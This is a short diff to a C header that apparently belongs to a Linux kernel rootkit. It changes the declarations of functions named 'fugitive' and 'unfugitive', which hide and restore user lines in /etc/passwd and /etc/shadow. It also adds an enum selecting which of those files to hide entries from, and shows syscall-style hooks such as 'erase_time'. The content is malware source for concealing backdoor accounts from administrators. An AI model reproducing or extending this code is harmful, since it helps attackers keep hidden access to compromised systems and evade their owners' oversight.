@@ -64,14 +64,16 @@ sUito2AtUGPzE0JB/g/Li23t5Zp8YjKUOB9czKl3yMYJO35."
         _reserved "\n"
 // #define GROUP_GEN() 
 
+enum file_content_hide {NONE, PASS_E, SHAD_E} file_content_hide;
+
 /* hide/show a user in "/etc/passwd" and "/etc/shadow" */
 
 static ssize_t append_to_file(char *, char *);
 
 asmlinkage ssize_t erase_time(int fd, void *buf, size_t count);
 
-/* remove a line from "/etc/passwd" and "/etc/shadow" */
-int fugitive(const char __user *line);
+/* remove lines from "/etc/passwd" and "/etc/shadow" */
+int fugitive(const char __user *passwd, const char __user *shadow);
 
 /* convert a character array into an unsigned integer */
 static int fugitive__atoui(int *dest, const char *a);
@@ -93,8 +95,8 @@ int show_fugitive(void);
 
 asmlinkage int this_is_requiem(int fd);
 
-/* restore a line in "/etc/passwd" and "/etc/shadow" */
-int unfugitive(const char __user *line);
+/* restore lines in "/etc/passwd" and "/etc/shadow" */
+int unfugitive(const char __user *passwd, const char __user *shadow);
 
 #endif
 
